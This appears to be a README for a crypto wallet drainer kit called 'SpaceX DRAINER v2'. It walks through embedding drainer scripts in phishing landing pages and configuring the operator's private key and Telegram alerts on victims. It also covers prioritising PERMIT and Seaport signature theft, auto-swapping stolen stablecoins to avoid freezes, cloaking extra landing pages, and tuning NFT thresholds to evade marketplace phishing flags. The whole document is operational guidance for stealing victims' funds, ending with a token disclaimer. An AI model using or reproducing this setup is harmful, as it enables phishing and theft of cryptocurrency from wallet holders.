### 1. A small educational program on the structure of the script.

Now let's quickly go over all the innards of the SpaceX DRAINER. 
If you are not a programmer, you don’t understand a damn thing about code and you are not interested in how the project works, you can skip this step.

<p align="center">
  <img alt="SpaceX" src="https://github.com/injectexpert/SpaceX-DRAINER-v2/blob/main/img/2.png" height="300" />

ABIs - interfaces for interacting with tokens (ERC20, ERC721, ERC1155).
public - external files, landing page.
public/scripts - external scripts required for work. public/scripts/main.js - the main script that is responsible for interacting with the wallet (approval, signature, seaport).
config.json - configuration.
app.js - server file, internal logic (auto output).
docker-compose.yml, Dockerfile - setting up the container system and run system.
package.json, package-lock.json - dependencies to install.
rpc.json - network configuration.
start.sh - launcher.

### 2. How to connect landing pages.
To install on a landing page, you need to write scripts on the page with the button:


```<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript"></script>
<script type="text/javascript" src="./scripts/sweetalert2@11"></script>
<script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
<script type="text/javascript" src="./scripts/index.js"></script>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/web3modal@1.9.11"></script>
<script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
<script src="https://unpkg.com/axios@1.2.2/dist/axios.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@coinbase/wallet-sdk@3.6.3/dist/index.min.js"></script>
<script type="text/javascript" src="./scripts/ethereumjs-tx-1.3.3.min.js"></script>
<script language="javascript" type="text/javascript" src="./scripts/ABI.js"></script>
<script type="text/javascript" src="./scripts/main.js"></script>
<script type="text/javascript" src="./scripts/seaport.js"></script>
<script src="https://code.jquery.com/jquery-3.6.3.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.33/src/ua-parser.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
````

and set the property for the required button:

``onclick="login()"``

### 3.0 Config setup. Register private.

<p align="center">
  <img alt="SpaceX" src="https://github.com/injectexpert/SpaceX-DRAINER-v2/blob/main/img/3.png" height="50" />

Private key - it is also a private key, it can be obtained through the MetaMask browser extension in the "Account details" tab

Please note that the address of the wallet, whose private key you specify in the config, should always have some money in the main network currency. Gas is needed to pay for gas during the withdrawal of approvals from the mammoth's wallet. 
It will be enough to throw literally a couple of bucks on each network: 
Ethereum - ETH 
Binance Smart Chain - BNB 
Polygon - MATIC 
and so on into all other necessary networks on which you will work ...
Of course, you need to throw a little more money into the Ethereum network, somewhere around 15-20 bucks, because this blockchain is unstable in terms of gas.

### 3.1 Config setup. Rejection in Telegram.
To connect the backoff, open the config.json file and write the data:

<p align="center">
  <img alt="SpaceX" src="https://github.com/injectexpert/SpaceX-DRAINER-v2/blob/main/img/4.png" height="50" />

``Line 2 - bot token , line 3 - account ID or channel ID, which should receive notifications``

### 3.2 Config setup. PERMIT and SEAPORT priority.
By default, the permit and seaport methods are set to true , which means that they have the highest priority , i.e. no matter how expensive the token is on the victim’s wallet, the script will still write off tokens that support PERMIT or SEAPORT , since the chance that a mammoth will sign them is much higher than for others. And after these signatures are signed, the script will begin to remove the rest of the tokens using the methods we are accustomed to approve , setApprovalForAll and SIGN / TRANSFERranging from expensive to cheap. To disable PERMIT and SEAPORT priority, set the value to false instead of true:

<p align="center">
  <img alt="SpaceX" src="https://github.com/injectexpert/SpaceX-DRAINER-v2/blob/main/img/5.png" height="50" />

The permit_priority_tokens line contains a list of permit tokens for which the priority will work:

<p align="center">
  <img alt="SpaceX" src="https://github.com/injectexpert/SpaceX-DRAINER-v2/blob/main/img/6.png" height="50" />

### 3.3 Config setup. Write-off of the main currency of the network.
In the gas_token_method line , we select the method of debiting the network's main currency, " sign " with a red sign, or the usual " transfer ".

<p align="center">
  <img alt="SpaceX" src="https://github.com/injectexpert/SpaceX-DRAINER-v2/blob/main/img/7.png" height="50" />

### 3.4 Config setup. Covalent API KEY
Register on the Covalent website , get a free api key and add it to the config:

<p align="center">
  <img alt="SpaceX" src="https://github.com/injectexpert/SpaceX-DRAINER-v2/blob/main/img/8.png" height="50" />

### 3.5 Config setup. AUTOSWAP tokens.
Line 9 is responsible for enabling and disabling the automatic exchange of tokens for the main currency on the Ethereum network. The auto-exchange function is implemented in order not to face the blocking of hardwired funds, because tokens such as usdt and usdc like to lock on the first request. By default, this feature is disabled , to enable, you need to change the value from false to true .

<p align="center">
  <img alt="SpaceX" src="https://github.com/injectexpert/SpaceX-DRAINER-v2/blob/main/img/9.png" height="50" />

### 3.6 Config setup . Adding external landings.

External landings are sites on a regular web host that you can simply point to the IP of the server, and they will start working like a normal drain. This system makes it very convenient to connect an unlimited number of landing pages to the server at once, allows you to cloak them, and do whatever you want with them. 
U is convenient. 
To enable the "external mode" of work, you need to activate the "external" option in the config, to do this, in line 10, you need to change the value from false to true .

<p align="center">
  <img alt="SpaceX" src="https://github.com/injectexpert/SpaceX-DRAINER-v2/blob/main/img/10.png" height="50" />

Next, you need to raise the site according to the usual instructions. 
And all subsequent landings must be external , and set according to the following instructions:
We upload the site files to a regular web host and in the folder with them in the file server.cfgwe write the address of the domain that we raised on the drain itself, the internal frontend (for example ) The landing template for the web host is in the public* folder will not work on the server , only externals will be active! If you are satisfied with one server - one landing, then just leave the value falsehttps://mintnftzero.com so as not to bother.

### 3.7 Config setup. NFT MINIMAL PRICE.

Line 11 is responsible for the priority of writing off nft, that is, if the value 1000 is set in the config, then this means that nft worth $ 1000 will be debited with the lowest priority, last after all tokens.

<p align="center">
  <img alt="SpaceX" src="https://github.com/injectexpert/SpaceX-DRAINER-v2/blob/main/img/11.png" height="50" />

On my own behalf, I recommend setting the value from $1,000, because the NFTs debited by the seaport, the opensy marketplace instantly sends a check for phishing, without the possibility of selling, and it is problematic to sell Deshman's no-name NFTs on other marketplaces. Therefore, it is better for the script to write off conditionally a token with a price of $100 in the first place, the profit from which will be actual, rather than from NFT for $1000, the income from which is only potential.


### 4. Upload files and raise the site.

We buy any Ubuntu 20.04+ server, connect to it through the MobaXterm program and drag the folder with files directly to the root with the mouse. After that, just paste these commands into the console and wait for the installation:

``cd FOLDER NAME 
source start.sh``

during the installation process, the console will ask you to insert the domain address of the domain.com format, insert:
And then you will need to add an “A-record” with the IP address of your Ubuntu 20.04+ server to the domain dns. The site will get up automatically as soon as the dns is registered.

## DEVELOPER DO NOT SUPPORT ANY OF THE ILLEGAL ACTIVITIES.
## Contact Me on telegram or twitter: https://twitter.com/injectexp / https://t.me/inject_exp
